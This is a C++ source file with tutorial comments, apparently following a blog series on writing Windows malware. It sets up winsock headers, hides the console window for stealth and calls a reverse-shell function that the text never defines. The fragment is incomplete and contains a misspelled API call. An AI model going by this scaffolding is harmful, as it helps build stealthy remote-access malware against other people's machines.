//Ref: https://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-2-1/
//
//C++ Headers

#include <winsock2.h>   //Socket Header
#include <windows.h>    //Win API Header
#include <ws2tcpip.h>   //TCP-IP Header

// C Header
#include <stdio.h>    //Input Output Header

//Debug C++ Header
#include <iostream>   //Input Output Debug Header

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


/* The #pragma comment will send a signal to the compiler to link the windows32 library Ws_32.lib with our program, winsocket will not work if this directive is not included */

/*
Headers one by one:

winsock2.h  : Includes all the TCP/ UDP socket funcitons, structs, and definitions of windows, it must be linked to the Ws_32.lib library for it to compile and work properly, hints the #pragram comment directive

windows.h : Because we are writing malware for windows we include all the windows api functios

ws2tcpip.h  : contains all the definitions for tcp/ip protocols to run accordingly

stdio.h / iostream   : Remember to comment out the #include <iostream> and remove the namespace standard when we compile the final payload else the size of the binary will increase to 1mb

*/


/*
 * We are writing a console application for windows
 * 
 *  We do not want the window to be open till the program ends, so we need to hide it, but we should be able to see the window when we are debugging the malwrae so that we can see what works and what not
 */


// Main function

int main()
{
  HWND stealth;       // Declare a window handle
  AllocConsole();   //Allocate a new console
  stealth=findWindowA("ConsoleWindowClass",NULL); // Find the previous Window handler and hide/show the window depending upon the next command
  ShowWindow(stealth,SW_SHOWNORMAL); //SW_SHOWNORAL = 1 = show, SW_HIDE = 0 = Hide the console
  RevShell();
  return 0;
}

/*

   HWND stealth; creates a window handle, a handle is a data table which contains detailed information about the memory address of the object

Note: In object-oriented languages, one application cannot access another data object or a system resource directly. This, an object must always return a handle which can be used by other applications to manage/modify it. In simple words, a handle is a data table which contians details information about the memroy address of the object. More information on windows data types can be found here: https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types?redirectedfrom=MSDN

   AllocConsole(); we allocate a console to the handle which can dispaly or hide the console. 

   stealth=findWindowA("ConsoleWindowClass",NULL); we pass the console class's name which is ConsoleWindowClass and store it in the handle named stealth and then hide it by passing it as an argument to the Win API ShowWindow

   ShowWindow(stealth,SW_SHOWNORMAL); win API ShowWindow takes the first argument as a handle and the second is an integer value which specifies what should be done with the window. 

*/
